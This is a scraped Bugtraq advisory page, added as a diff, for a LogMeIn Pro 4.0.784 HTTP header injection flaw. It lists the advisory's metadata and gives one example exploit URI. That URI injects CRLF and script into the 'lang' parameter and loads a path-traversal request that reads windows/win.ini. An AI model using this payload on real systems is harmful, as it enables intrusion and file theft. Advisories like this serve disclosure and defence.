@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid35236<p><b><span style="font-size: 18pt;">LogMeIn 'cfgadvanced.html' HTTP Header Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/35236/info">info</a><br><a href="http://www.securityfocus.com/bid/35236/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/35236/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/35236/solution">solution</a><br><a href="http://www.securityfocus.com/bid/35236/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				35236
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 05 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 05 2009 04:49PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Inferno
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					LogMeIn LogMeIn Pro 4.0.784 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit this issue through a browser. <br/><br/>The following example URI is available: <br/>http://securethoughts.com/2009/06/multiple-vulnerabilities-in-logmein-web-interface-can-be-used-to-control-your-computer-and-steal-arbitary-files/#viewSource<br/>http://www.example.com/cfgadvanced.html?op=update&amp;amp;DisconnectExisting=1&amp;amp;NoHttpCompr=1&amp;amp;CrashDumpInfo=0&amp;amp;lang=en-US%0D%0A%0D%0A%3Chtml%3E%3Cbody%3E%3C/body%3E%3CSCRIPT%3Evar%20ifr%3Dnull%3Bfunction%20al%28%29%7Bvar%20str%3D%28window.frames%5B0%5D.document.body.innerHTML%20%7C%7C%20ifr.contentDocument.documentElement.innerHTML%29%3Balert%28str.substring%28%28str.toLowerCase%28%29%29.indexOf%28%22%3Clegend%3E%22%2C400%29%29%29%3B%7D%20if%28window.location.href.match%28/.*cfgad.*/%29%29%7Bifr%3Ddocument.createElement%28%22iframe%22%29%3Bifr.src%3D%22https%3A//localhost%3A2002/logs.html%3Flog%3D../../../windows/win.ini%22%3Bdocument.body.appendChild%28ifr%29%3BsetTimeout%28%22al%28%29%22%2C4000%29%3B%7D%3C/script%3E%3C%21--
+	
+		<ul>
+</ul>
+</div>
